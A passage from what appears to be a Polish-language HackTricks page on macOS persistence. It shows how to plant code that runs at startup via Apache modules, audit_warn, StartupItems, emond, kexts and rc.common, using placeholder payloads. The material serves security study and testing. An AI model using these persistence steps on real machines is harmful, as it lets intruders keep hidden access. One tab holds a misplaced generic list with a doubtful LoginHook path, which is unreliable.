#### Lokalizacja

* **`/etc/apache2/httpd.conf`**
* Wymagane uprawnienia roota
* Wywołanie: Gdy Apache2 jest uruchamiany

#### Opis & Wykorzystanie

Możesz wskazać w pliku `/etc/apache2/httpd.conf`, aby załadować moduł, dodając wiersz tak jak:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

W ten sposób twoje skompilowane moduły zostaną załadowane przez Apache. Jedyną rzeczą jest to, że musisz **podpisać go ważnym certyfikatem Apple**, lub musisz **dodać nowy zaufany certyfikat** w systemie i go **podpisać**.

Następnie, jeśli to konieczne, upewnij się, że serwer zostanie uruchomiony, wykonując:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Przykład kodu dla Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM framework audytowy

Opis: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Przydatny do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale potrzebujesz uprawnień roota, aby auditd działał i wywołał ostrzeżenie
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* **`/etc/security/audit_warn`**
* Wymagane uprawnienia roota
* **Wywołanie**: Gdy auditd wykryje ostrzeżenie

#### Opis i Wykorzystanie

Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **wykonywany**. Możesz więc dodać swój ładunek do niego.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Elementy uruchamiania

{% hint style="danger" %}
**Jest to przestarzałe, więc nie powinno być tam nic znalezionego.**
{% endhint %}

**StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu musi on zawierać dwa konkretne pliki:

1. Skrypt **rc**: Skrypt powłoki wykonywany podczas uruchamiania.
2. Plik **plist**, o nazwie `StartupParameters.plist`, który zawiera różne ustawienia konfiguracyjne.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` są poprawnie umieszczone w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

### Lokalizacje automatycznego uruchamiania w macOS

W systemie macOS istnieje wiele miejsc, w których można skonfigurować aplikacje do automatycznego uruchamiania po zalogowaniu. Poniżej znajduje się lista głównych lokalizacji, w których można znaleźć takie konfiguracje:

1. **Folder Login Items**: Można go znaleźć w ustawieniach systemowych w sekcji "Users & Groups". Aplikacje dodane do tego folderu uruchamiają się automatycznie po zalogowaniu.

2. **Folder LaunchAgents**: Znajduje się w `/Library/LaunchAgents` lub `~/Library/LaunchAgents`. Tutaj można znaleźć pliki konfiguracyjne, które uruchamiają się przy każdym logowaniu.

3. **Folder LaunchDaemons**: Znajduje się w `/Library/LaunchDaemons`. Podobnie jak w przypadku LaunchAgents, pliki w tym folderze uruchamiają się przy każdym uruchomieniu systemu.

4. **Folder StartupItems**: Znajduje się w `/Library/StartupItems`. Jest to stary sposób dodawania aplikacji do automatycznego uruchamiania i nie jest zalecany w nowszych wersjach macOS.

5. **Cron Jobs**: Można je skonfigurować za pomocą `crontab -e` w terminalu. Cron Jobs pozwalają na uruchamianie poleceń o określonych godzinach, co może być wykorzystane do automatycznego uruchamiania aplikacji.

6. **Folder LoginHook**: Znajduje się w `/Library/Security/SecurityAgentPlugins/LoginHook`. Można tutaj umieścić skrypt, który zostanie wykonany po zalogowaniu.

Pamiętaj, że kontrola tych lokalizacji jest istotna dla zapewnienia bezpieczeństwa systemu macOS. Złośliwe aplikacje mogą próbować ukryć się w tych miejscach, aby uruchamiać się automatycznie i działać w tle. Dlatego regularne sprawdzanie i monitorowanie tych lokalizacji jest zalecane. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
### ~~emond~~

{% hint style="danger" %}
Nie mogę znaleźć tego komponentu w moim systemie macOS, więc dla dalszych informacji sprawdź opis
{% endhint %}

Opis: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Wprowadzony przez Apple, **emond** to mechanizm logowania, który wydaje się być niewystarczająco rozwinięty lub być może porzucony, ale nadal jest dostępny. Chociaż nie jest to szczególnie korzystne dla administratora Maca, ta mało znana usługa może służyć jako subtelna metoda trwałości dla aktorów zagrożeń, prawdopodobnie niezauważona przez większość administratorów macOS.

Dla osób świadomych jego istnienia, identyfikacja jakiejkolwiek złośliwej użyteczności **emond** jest prosta. LaunchDaemon systemu dla tej usługi poszukuje skryptów do wykonania w jednym katalogu. Aby to sprawdzić, można użyć następującej komendy:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Lokalizacja

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Wymagane uprawnienia roota
* **Wywołanie**: Z XQuartz

#### Opis i Wykorzystanie

XQuartz **nie jest już instalowany w macOS**, więc jeśli chcesz uzyskać więcej informacji, sprawdź writeup.

### ~~kext~~

{% hint style="danger" %}
Jest tak skomplikowane zainstalowanie kext nawet jako root, że nie będę tego rozważał jako ucieczkę z piaskownicy ani do trwałości (chyba że masz exploit)
{% endhint %}

#### Lokalizacja

Aby zainstalować KEXT jako element uruchamiania, musi być **zainstalowany w jednym z następujących miejsc**:

* `/System/Library/Extensions`
* Pliki KEXT wbudowane w system operacyjny OS X.
* `/Library/Extensions`
* Pliki KEXT zainstalowane przez oprogramowanie firm trzecich

Możesz wyświetlić obecnie załadowane pliki kext za pomocą:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Aby uzyskać więcej informacji na temat [**rozszerzeń jądra, sprawdź tę sekcję**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Lokalizacja

* **`/usr/local/bin/amstoold`**
* Wymagane uprawnienia roota

#### Opis i eksploatacja

Wygląda na to, że `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego, eksponując usługę XPC... problem polegał na tym, że plik binarny nie istniał, więc można było umieścić tam coś własnego, a gdy usługa XPC zostanie wywołana, zostanie wywołany twój plik binarny.

Nie mogę już znaleźć tego w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Lokalizacja

* **`/Library/Preferences/Xsan/.xsanrc`**
* Wymagane uprawnienia roota
* **Wywołanie**: Gdy usługa jest uruchamiana (rzadko)

#### Opis i eksploatacja

Wygląda na to, że uruchamianie tego skryptu nie jest zbyt powszechne i nawet nie mogłem go znaleźć w moim macOS, więc jeśli chcesz uzyskać więcej informacji, sprawdź opis.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**To nie działa w nowoczesnych wersjach MacOS**
{% endhint %}

Możliwe jest również umieszczenie tutaj **poleceń, które zostaną wykonane podczas uruchamiania systemu.** Przykładowy skrypt rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniki i narzędzia trwałości

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Zacznij od zera i zostań ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
